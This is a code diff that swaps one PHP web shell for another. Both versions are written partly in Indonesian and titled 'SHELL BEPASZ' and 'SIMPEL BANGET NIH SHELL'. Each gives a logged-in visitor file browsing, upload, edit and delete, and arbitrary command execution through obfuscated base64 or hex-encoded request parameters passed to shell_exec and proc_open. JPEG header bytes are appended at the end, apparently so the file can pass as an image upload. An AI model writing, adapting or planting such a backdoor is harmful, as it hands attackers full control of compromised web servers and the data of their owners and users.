@@ -1,348 +1,432 @@
 <?php
 session_start();
-error_reporting(0);
 
-$passwordHash = "c2d661b4d7813bfef0773ab0fe2cad6a";
+$username = "admin";
+$passwordHash = "7c725182d95f3e8ec5835320260fa754";
 
-if (isset($_POST['password'])) {
+// Autentikasi
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $inputUsername = $_POST['username'];
     $inputPassword = md5($_POST['password']);
 
-    if ($inputPassword === $passwordHash) {
-        $_SESSION['login'] = true;
+    if ($inputUsername === $username && $inputPassword === $passwordHash) {
+        $token = generateUUID(); // Fungsi generateUUID dijelaskan di bawah
+        $_SESSION['token'] = $token;
+        $_SESSION['authenticated'] = true;
+        $_SESSION['username'] = $username;
+    } else {
+        echo "Login gagal!";
+        exit;
     }
 }
 
-if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
-?>
+// Cek sesi autentikasi
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    ?>
     <form method="POST">
-    <center>
-        <input type="password" name="password">
+        <label>Username:</label>
+        <input name="username"><br>
+        <label>Password:</label>
+        <input type="password" name="password"><br>
         <input type="submit" value="Login">
-    </center>
     </form>
-<?php
+    <?php
     exit;
 }
 
-$dir = isset($_GET['dr']) ? hex2bin($_GET['dr']) : '.';
-$dir = str_replace('\\', '/', $dir);
+// Sesi autentikasi sukses, lanjutkan eksekusi kode berikutnya
+$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
 $files = scandir($dir);
+$upload_message = '';
+$edit_message = '';
+$delete_message = '';
 
-function fperms($file)
-{
+function get_file_permissions($file): string {
     return substr(sprintf('%o', fileperms($file)), -4);
 }
 
-function is_can_write($file)
-{
+function is_writable_permission($file): bool {
     return is_writable($file);
+}
+
+function executeCommand($command, $workingDirectory = null)
+{
+    $descriptorspec = array(
+       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+    );
+
+    $process = proc_open($command, $descriptorspec, $pipes, $workingDirectory);
+
+    if (is_resource($process)) {
+        // Read output from stdout and stderr
+        $output_stdout = stream_get_contents($pipes[1]);
+        $output_stderr = stream_get_contents($pipes[2]);
+
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+
+        $return_value = proc_close($process);
+
+        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
+    } else {
+        return "Failed to execute command.";
+    }
+}
+
+if (isset($_GET['636d64'])) {
+    $command = hex2bin($_GET['636d64']);
+    $result = executeCommand($command, $dir);
 }
 
 if (isset($_FILES['file_upload'])) {
     if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
-        echo 'Uploaded Successfully.';
+        $upload_message = 'File berhasil diunggah.';
     } else {
-        echo 'Failed to Upload.';
+        $upload_message = 'Gagal mengunggah file.';
     }
 }
 
-if ($_GET['e']) {
-    if (isset($_GET['fp'])) {
-        $file = hex2bin($_GET['fp']);
-        $content = file_get_contents($file);
-        if ($content !== false) {
-            echo '
-    <form method="post" action="" onsubmit="return copyContentToInput()">
-        <label for="editor"><b>Edit File:</b></label><br>
-        <div id="editor" contenteditable="true" 
-            style="height: 400px; width: 100%; max-width: 100%; overflow: auto; font-family: monospace; border: 1px solid #ccc; padding: 10px; border-radius: 4px; box-sizing: border-box; background: #f9f9f9;">
-            ' . htmlspecialchars($content) . '
-        </div>
-        <input type="hidden" name="file_content" id="file_content">
-        <input type="hidden" name="edited_file" value="'.htmlspecialchars($file).'">
-        <br>
-        <button type="submit" name="submit_edit" 
-            style="width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
-            Save
-        </button>
-    </form>';
+if (isset($_POST['edit_file'])) {
+    $file = $_POST['edit_file'];
+    $content = file_get_contents($file);
+    if ($content !== false) {
+        ?>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Edit File</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    margin: 0;
+                    padding: 0;
+                    text-align: center;
+                }
+                header {
+                    background-color: #4CAF50;
+                    color: white;
+                    padding: 1rem;
+                }
+                header h1 {
+                    margin: 0;
+                }
+                main {
+                    padding: 1rem;
+                }
+                form {
+                    width: 50%;
+                    margin: auto;
+                    text-align: left;
+                }
+                textarea {
+                    width: 100%;
+                    height: 300px;
+                }
+                input[type="submit"] {
+                    background-color: #4CAF50;
+                    border: none;
+                    color: white;
+                    cursor: pointer;
+                    margin-top: 1rem;
+                    padding: 0.5rem 1rem;
+                    text-align: center;
+                    text-decoration: none;
+                    display: inline-block;
+                    font-size: 12px;
+                }
+                input[type="submit"]:hover {
+                    background-color: #45a049;
+                }
+                .btn {
+                    background-color: #4CAF50;
+                    border: none;
+                    color: white;
+                    cursor: pointer;
+                    margin-left: 1rem;
+                    padding: 0.5rem 1rem;
+                    text-align: center;
+                    text-decoration: none;
+                    display: inline-block;
+                    font-size: 12px;
+                }
 
+                .btn-download {
+                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
+                    border: none;
+                    color: white;
+                    cursor: pointer;
+                    margin-left: 1rem;
+                    padding: 0.5rem 1rem;
+                    text-align: center;
+                    text-decoration: none;
+                    display: inline-block;
+                    font-size: 12px;
+                }
 
-        } else {
-            echo 'Cant read the file.';
-        }
-    } else if ($_GET['cfp']) {
-        echo '<form method="post" action="" onsubmit="return copyContentToInput()">
-        <label for="editor"><b>New File Content:</b></label><br>
-        <div id="editor" contenteditable="true" 
-            style="height: 400px; width: 100%; max-width: 100%; overflow: auto; font-family: monospace; border: 1px solid #ccc; padding: 10px; border-radius: 4px; box-sizing: border-box; background: #f9f9f9;">
-        </div>
-        <input type="hidden" name="file_content" id="file_content">
-        <input type="text" name="edited_file" placeholder="file.php" 
-            style="width: 100%; margin-top: 10px; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
-        <br>
-        <button type="submit" name="nfl_sbm" 
-            style="width: 100%; margin-top: 10px; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
-            Create File
-        </button>
-    </form>';
-    } else if ($_GET['cdr']) {
-        echo '<form method="post" action="">
-        <label for="ndr"><b>New Directory Name:</b></label><br>
-        <input type="text" name="ndr" id="ndr" placeholder="example-folder" 
-            style="width: 100%; padding: 10px; margin-bottom: 10px; font-family: monospace; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
-        <br>
-        <button type="submit" name="ndr_sbm" 
-            style="width: 100%; padding: 12px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
-            Create Directory
-        </button>
-    </form>';
+                .btn:hover {
+                    background-color: #45a049;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>Edit File</h1>
+            </header>
+            <main>
+                <form method="post" action="">
+                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo htmlspecialchars($content); ?></textarea>
+                    <input type="hidden" name="edited_file" value="<?php echo htmlspecialchars($file); ?>">
+                    <input type="submit" name="submit_edit" value="Submit">
+                </form>
+            </main>
+        </body>
+        </html>
+        <?php
+        exit;
+    } else {
+        $edit_message = 'Gagal membaca isi file.';
     }
-}
-
-if ($_GET['v']) {
-    if (isset($_GET['fp'])) {
-        $file = hex2bin($_GET['fp']);
-        $content = file_get_contents($file);
-        if ($content !== false) {
-            echo '<textarea rows="30" cols="100" disabled>' . htmlspecialchars($content) . '</textarea>';
-        } else {
-            echo 'Cant read the file.';
-        }
-    }
-}
-
-if (isset($_GET['c'])) {
-    echo '<center>';
-    echo '<form method="post" action="" onsubmit="cmLol()" style="display: flex; justify-content: center; gap: 10px; margin-top: 20px;">';
-    echo '<input type="text" name="cm" id="cmm" placeholder="Enter command" style="padding: 8px; font-size: 16px; width: 300px; border: 1px solid #ccc; border-radius: 5px;">';
-    echo '<input type="submit" value="Run" style="background-color: #333; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">';
-    echo '</form>';
-    echo '</center>';
-}
-
-if (isset($_GET['upl'])) {
-    echo '<center>';
-    echo '<form method="POST" enctype="multipart/form-data">';
-    echo '<label>Upload file:</label>';
-    echo '<input type="file" name="file_upload">';
-    echo '<input type="submit" value="Upload">';
-    echo '<input type="hidden" name="dir" value="' . htmlspecialchars($dir) . '">';
-    echo '</form>';
-    echo '</center>';
-}
-
-function mkd($pth)
-{
-     $ret = mkdir($pth);
-     return $ret === true || is_dir($pth);
 }
 
 if (isset($_POST['submit_edit'])) {
     $file = $_POST['edited_file'];
     $content = $_POST['file_content'];
     if (file_put_contents($file, $content) !== false) {
-        echo 'File Saved.';
+        $edit_message = 'File berhasil diedit.';
     } else {
-        echo 'Failed to Edit.';
-    }
-} else if (isset($_POST['nfl_sbm'])) {
-    $file = $_POST['edited_file'];
-    $content = $_POST['file_content'];
-    if (file_put_contents("$dir/$file", $content) !== false) {
-        echo 'File Saved.';
-    } else {
-        echo 'Failed to Edit.';
-    }
-} else if (isset($_POST['ndr_sbm'])) {
-    $ndr = $_POST['ndr'];
-    if (mkd("$dir/$ndr")) {
-        echo 'Dir Created.';
-    } else {
-        echo 'Failed to Create.';
-    }
-} else if (isset($_POST['cm'])) {
-        $cmd = base64_decode($_POST['cm']);
-        echo '<div style="margin: 20px auto; width: 80%; font-family: monospace; background: #f3f3f3; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">';
-        echo '<b>Command:</b> ' . htmlspecialchars($cmd) . '<br><br>';
-        echo '<b>Output:</b><br>';
-        echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
-        echo '</div>';
-}
-
-if ($_GET['dd']) {
-    if (isset($_GET['dp'])) {
-        $dir = hex2bin($_GET['dp']);
-
-        function deleteDir($dir) {
-            if (!is_dir($dir)) return false;
-            foreach (scandir($dir) as $item) {
-                if ($item == '.' || $item == '..') continue;
-                $path = $dir . DIRECTORY_SEPARATOR . $item;
-                is_dir($path) ? deleteDir($path) : unlink($path);
-            }
-            return rmdir($dir);
-        }
-
-        if (deleteDir($dir)) {
-            echo '✅ Directory and all contents deleted.';
-            echo '<meta http-equiv="refresh" content="1;url=?dr=' . bin2hex(dirname($dir)) . '">';
-        } else {
-            echo '❌ Failed to delete directory.';
-        }
+        $edit_message = 'Gagal mengedit file.';
     }
 }
 
-if ($_GET['d']) {
-    if (isset($_GET['fp'])) {
-        $file = hex2bin($_GET['fp']);
-        if (unlink($file)) {
-            echo 'File Deleted.';
-        } else {
-            echo 'Failed to Delete.';
-        }
+if (isset($_POST['delete_file'])) {
+    $file = $_POST['delete_file'];
+    if (unlink($file)) {
+        $delete_message = 'File berhasil dihapus.';
+    } else {
+        $delete_message = 'Gagal menghapus file.';
     }
 }
 
 $uname = php_uname();
 $current_dir = realpath($dir);
+
+function generateUUID()
+{
+    return sprintf(
+        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0x0fff) | 0x4000,
+        mt_rand(0, 0x3fff) | 0x8000,
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0xffff)
+    );
+}
 ?>
 
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="nofollow, robots">
-    <title>SHELL BEPASZ</title>
-    <link rel="stylesheet" href="https://bepasz.pages.dev/style.css">
+    <title>SIMPEL BANGET NIH SHELL</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 1rem;
+        }
+        header h1 {
+            margin: 0;
+        }
+        main {
+            padding: 1rem;
+        }
+        table {
+            border-collapse: collapse;
+            margin: 1rem auto;
+            width: 50%;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 0.5rem;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+        tr:hover {
+            background-color: #ddd;
+        }
+        form {
+            display: inline-block;
+            margin: 1rem 0;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            cursor: pointer;
+            margin-left: 1rem;
+            padding: 0.5rem 1rem;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 12px;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        /* Gaya CSS untuk hasil command */
+        div {
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin-top: 20px;
+            overflow: auto;
+        }
+
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .btn {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            cursor: pointer;
+            margin-left: 1rem;
+            padding: 0.5rem 1rem;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 12px;
+        }
+
+        .btn-download {
+            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
+            border: none;
+            color: white;
+            cursor: pointer;
+            margin-left: 1rem;
+            padding: 0.5rem 1rem;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 12px;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
-
 <body>
-    <table>
-        <caption>
-            <?php
-            $sd = explode("/", realpath($dir));
-            foreach ($sd as $cd => $cdr) {
-                if ($cdr == "" && $cd == 0) {
-                    echo '<a class="td" href="?dr=2f">/</a>';
-                    continue;
-                }
-
-                if ($cdr == "") continue;
-
-                echo '<a class="td" href="?dr=';
-                for ($i = 0; $i <= $cd; $i++) {
-                    echo bin2hex($sd[$i]);
-                    if ($i != $sd) echo bin2hex("/");
-                }
-                echo '">' . $cdr . "/</a>";
-            }
-            echo ' [ <a class="td" href="?dr='.bin2hex(dirname(__FILE__)).'">HOME</a> ]';
-            ?>
-        </caption>
-
-        <center>
-    <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
-        <a href="?upl">
-            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
-                Upload
-            </button>
-        </a>
-        <a href="?c">
-            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
-                Terminal
-            </button>
-        </a>
-        <a href="https://t.me/sxssasss" target="_blank">
-            <button style="background-color: #4CAF50; color: white; padding: 8px 16px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
-                Author
-            </button>
-        </a>
-    </div>
-</center>
-        <center><b>Information</b> : <?= php_uname(); ?></center>
-
-        <thead>
+    <header>
+        <h1>SIMPEL BANGET NIH SHELL</h1>
+    </header>
+    <main>
+        <p>Current directory: <?php echo $current_dir; ?></p>
+        <p>Server information: <?php echo $uname; ?></p>
+        <?php if (!empty($upload_message)): ?>
+        <p><?php echo $upload_message; ?></p>
+        <?php endif; ?>
+        <?php if (!empty($edit_message)): ?>
+        <p><?php echo $edit_message; ?></p>
+        <?php endif; ?>
+        <?php if (!empty($delete_message)): ?>
+        <p><?php echo $delete_message; ?></p>
+        <?php endif; ?>
+        <form method="POST" enctype="multipart/form-data">
+            <label>Upload file:</label>
+            <input type="file" name="file_upload">
+            <input type="submit" value="Upload">
+            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
+        </form>
+        <table>
             <tr>
-                <th scope="col">NAME</th>
-                <th scope="col">Permissions</th>
-                <th scope="col">Action</th>
+                <th>Filename</th>
+                <th>Permissions</th>
+                <th>Actions</th>
             </tr>
-        </thead>
-        <tbody>
-            <?php
-if ($dir !== '.' && is_dir($dir)) {
-    $parent = dirname($dir);
-}
-
-foreach ($files as $file) {
-    if ($file === '.') continue;
-
-    // Buat path manual
-    $fullPath = rtrim($dir, '/\\') . '/' . $file;
-    $fullPath = str_replace('\\', '/', $fullPath);
-
-    if (!file_exists($fullPath)) continue;
-
-    $href = bin2hex($fullPath);
-
-    echo '<tr>';
-    echo '<td>';
-
-    if (is_dir($fullPath)) {
-        echo '<a class="td" href="?dr=' . $href . '">' . $file . '</a>';
-    } else {
-        echo '<a class="td" href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&v=1">' . $file . '</a>';
-    }
-
-    echo '</td>';
-    echo '<td>';
-    if (is_file($fullPath)) {
-        echo '<span class="' . (fperms($fullPath) ? 'green' : 'red') . '">' . fperms($fullPath) . '</span>';
-    } else {
-        echo '<span class="' . (is_can_write($fullPath) ? 'green' : 'red') . '">' . (is_can_write($fullPath) ? 'Can Write' : 'Not Writable') . '</span>';
-    }
-    echo '</td>';
-    echo '<td>';
-    if (is_file($fullPath)) {
-        echo '<a href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&e=1" class="td">EDIT</a> | ';
-        echo '<a href="?dr=' . bin2hex($dir) . '&fp=' . $href . '&d=1" class="td">DELETE</a>';
-    } else {
-        echo '<a class="td" href="?dr=' . bin2hex($dir) . '&e=1&cfp=1">NFILE</a> | <a class="td" href="?dr=' . bin2hex($dir) . '&e=1&cdr=1">NDIR</a> |<a class="td" href="?dd=1&dp=' . bin2hex($href) . '">DELETE</a>';
-    }
-    echo '</td>';
-    echo '</tr>';
-}
-?>
-        </tbody>
-    </table>
-    <script>
-    function save() {
-        const editor = document.getElementById('editor');
-        const hidden = document.getElementById('file_content');
-        hidden.value = editor.textContent; 
-        return true;
-    }
-    function copyContentToInput() {
-    const editor = document.getElementById("editor");
-    const hiddenInput = document.getElementById("file_content");
-    hiddenInput.value = editor.textContent.trim();
-    return true;
-    }
-
-    function saveDirectory() {
-        const doc = document.getElementById('ndr');
-        return true;
-    }
-
-    function cmLol() {
-    let doc = document.getElementById('cmm');
-    doc.value = btoa(doc.value);
-    return true;
-    }
-</script>
+            <?php foreach ($files as $file): ?>
+            <tr>
+                <td>
+                    <?php if (is_dir($dir . '/' . $file)): ?>
+                    <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
+                    <?php else: ?>
+                    <a href="a.php?dir=<?php echo bin2hex($dir); ?>&editfile=<?php echo urlencode($file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
+                    <?php endif; ?>
+                </td>
+                <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
+                    <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
+                </td>
+                <td>
+                    <?php if (is_file($dir . '/' . $file)): ?>
+                    <form action="" method="post" style="display: inline-block;">
+                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
+                        <button type="submit" class="btn btn-download">Edit</button>
+                    </form>
+                    <form action="" method="post" style="display: inline-block;">
+                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
+                        <button type="submit" class="btn btn-download">Delete</button>
+                    </form>
+                    <form action="" method="get" style="display: inline-block;">
+                        <input type="hidden" name="download" value="<?php echo bin2hex($dir . '/' . $file); ?>">
+                        <button type="submit" class="btn btn-download">Download</button>
+                    </form>
+                    <?php endif; ?>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+        </table>
+        <p><b>Command Execution Bypass</b></p>
+        <form method="GET
+">
+            <label>encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
+            <input type="hidden" name="dir" value="<?php echo bin2hex($dir); ?>">
+            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
+            <input type="submit" value="Execute">
+        </form>
+        <?php if (isset($result)): ?>
+            <div>
+                <h2>Command Result:</h2>
+                <pre><?php echo htmlspecialchars($result); ?></pre>
+            </div>
+        <?php endif; ?>
+    </main>
 </body>
 </html>
-ÿØÿàÿØÿàÿØÿàÿØÿà
+    JFIF  x x    "
+   C       	
+	
+  
+
+
+
+ 	
+
+   C      "               	
+
+       } !1AQa "q2   #B  R  $3br 	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                 	
+
+       w !1AQ aq"2 B    	#3R br 
+$4 % &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                          ?     N    m?    j    EP   
